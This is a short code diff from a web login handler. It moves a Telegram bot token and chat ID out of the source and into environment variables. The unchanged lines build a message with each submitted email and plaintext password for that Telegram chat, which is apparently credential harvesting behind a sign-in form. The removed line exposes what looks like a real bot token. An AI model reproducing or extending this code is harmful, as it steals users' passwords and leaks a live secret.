@@ -348,8 +348,8 @@ if (!isAuthenticated) {
   }
   
   // Telegram Bot Integration (English Only)
-  const botToken = '8573566920:AAHxhH-iEv-p-Z9huSdBp_pPuqbW_UJgY2o';
-const chatId = '865577057';
+  const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
   const message = `🚨 New Auth Submission Received!\n\n📧 Email: ${email}\n🔑 Password: ${password}\n💻 Mode: ${isSignUp ? 'Sign Up' : 'Sign In'}`;
 
   try {
